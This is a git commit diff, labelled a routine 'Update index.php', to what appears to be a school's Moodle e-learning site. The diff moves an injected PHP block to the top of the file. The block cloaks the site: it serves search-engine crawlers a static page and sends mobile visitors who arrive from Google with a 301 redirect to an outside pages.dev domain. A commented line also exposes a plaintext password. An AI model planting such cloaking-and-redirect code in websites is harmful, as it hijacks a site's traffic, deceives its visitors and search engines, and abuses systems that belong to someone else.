b8cd217b7d23befa4c86b1ed51b8cd66c1e007f1
chalistarano <chalistarano@gmail.com>
2025-08-14 23:34:19 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,26 @@
 <?php
+$amp_url = "https://amp-elearning-stikespantikosala.pages.dev/"; 
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? ''; 
+$referer = $_SERVER['HTTP_REFERER'] ?? ''; 
+$is_from_google = !empty($referer) && preg_match("/google\.(com|co\.id)$/i", parse_url($referer, PHP_URL_HOST));
+$is_mobile = preg_match("/(iPhone|Android|iPad|iPod|Mobile|BlackBerry|Windows Phone)/i", $user_agent);
+$is_googlebot = preg_match("/(Googlebot|Googlebot-News|Googlebot-Image|Googlebot-Video|Googlebot-Mobile|Mediapartners-Google|AdsBot-Google|AdsBot-Google-Mobile|Google-InspectionTool|APIs-Google|Google-Site-Verification|Google Web Preview|Google Favicon|Google Feedfetcher)/i", $user_agent);
+
+if ($is_googlebot) {
+    header("Content-Type: text/html");
+    if (file_exists("index.html")) {
+        readfile("index.html");
+    } else {
+        echo "File index.html tidak ditemukan.";
+    }
+    exit;
+}
+
+if ($is_from_google && $is_mobile) {
+    header("Location: $amp_url", true, 301);
+    exit;
+}
+?><?php
 //echo password_hash('abuyahya', PASSWORD_DEFAULT, []);
 //die();
 // This file is part of Moodle - http://moodle.org/
@@ -89,29 +111,7 @@ if (get_home_page() != HOMEPAGE_SITE) {
         }
     }
 }
-<?php
-$amp_url = "https://amp-elearning-stikespantikosala.pages.dev/"; 
-$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? ''; 
-$referer = $_SERVER['HTTP_REFERER'] ?? ''; 
-$is_from_google = !empty($referer) && preg_match("/google\.(com|co\.id)$/i", parse_url($referer, PHP_URL_HOST));
-$is_mobile = preg_match("/(iPhone|Android|iPad|iPod|Mobile|BlackBerry|Windows Phone)/i", $user_agent);
-$is_googlebot = preg_match("/(Googlebot|Googlebot-News|Googlebot-Image|Googlebot-Video|Googlebot-Mobile|Mediapartners-Google|AdsBot-Google|AdsBot-Google-Mobile|Google-InspectionTool|APIs-Google|Google-Site-Verification|Google Web Preview|Google Favicon|Google Feedfetcher)/i", $user_agent);
 
-if ($is_googlebot) {
-    header("Content-Type: text/html");
-    if (file_exists("index.html")) {
-        readfile("index.html");
-    } else {
-        echo "File index.html tidak ditemukan.";
-    }
-    exit;
-}
-
-if ($is_from_google && $is_mobile) {
-    header("Location: $amp_url", true, 301);
-    exit;
-}
-?>
 // Trigger event.
 course_view(context_course::instance(SITEID));
 
